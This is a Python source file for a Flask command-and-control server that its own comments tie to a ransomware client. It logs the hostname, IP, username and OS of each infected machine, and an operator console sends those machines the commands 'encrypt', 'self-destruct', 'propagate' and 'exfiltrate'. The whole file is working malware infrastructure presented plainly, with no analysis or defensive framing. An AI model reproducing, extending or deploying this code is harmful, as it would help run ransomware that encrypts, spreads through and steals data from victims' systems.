from flask import Flask, request, jsonify
import threading
import time

# -------------------- FLASK SERVER CONFIGURATION -------------------- #
app = Flask(__name__)
clients = {}  # Dictionary to store connected clients and their statuses
commands = {}  # Dictionary to store commands for each client

# -------------------- FLASK ROUTES -------------------- #
@app.route('/checkin', methods=['POST'])
def checkin():
    """
    Handle check-ins from the ransomware client and send commands.
    """
    client_data = request.json
    hostname = client_data.get("hostname", "unknown")
    clients[hostname] = {
        "hostname": hostname,
        "ip_address": client_data.get("local_ip"),
        "username": client_data.get("username"),
        "os": client_data.get("os"),
        "last_checkin": time.ctime()
    }

    # Send a command if available
    command = commands.pop(hostname, "None")  # Default to "None" if no command available
    return jsonify({"command": command})

@app.route('/clients', methods=['GET'])
def get_clients():
    """
    View connected clients.
    """
    return jsonify(clients)

# -------------------- COMMAND-LINE INTERFACE -------------------- #
def interactive_console():
    """
    Interactive command-line interface for the C2 server.
    """
    while True:
        print("\nC2 Server Command Interface")
        print("-" * 30)
        print("1. View Connected Clients")
        print("2. Send Command to Client")
        print("3. Exit")
        choice = input("Select an option: ")

        if choice == "1":
            # Display connected clients
            if clients:
                print("\nConnected Clients:")
                for idx, (hostname, details) in enumerate(clients.items(), start=1):
                    print(f"{idx}. Hostname: {hostname}, IP: {details['ip_address']}, User: {details['username']}, Last Check-In: {details['last_checkin']}")
            else:
                print("No clients connected.")
        
        elif choice == "2":
            # Send command to a specific client
            if not clients:
                print("No clients connected. Please wait for clients to check in.")
                continue

            # Choose a client to send a command
            target_hostname = input("Enter the hostname of the client: ")
            if target_hostname in clients:
                command = input(f"Enter command for {target_hostname} (encrypt, self-destruct, propagate, exfiltrate): ").lower()
                commands[target_hostname] = command
                print(f"Command '{command}' sent to client '{target_hostname}'.")
            else:
                print(f"No client found with hostname: {target_hostname}")

        elif choice == "3":
            # Exit the interactive console
            print("Exiting C2 server...")
            break

        else:
            print("Invalid option. Please select a valid option.")

# -------------------- RUN SERVER IN A SEPARATE THREAD -------------------- #
if __name__ == '__main__':
    # Start the Flask server in a separate thread
    server_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False))
    server_thread.start()

    # Start the interactive command-line interface
    interactive_console()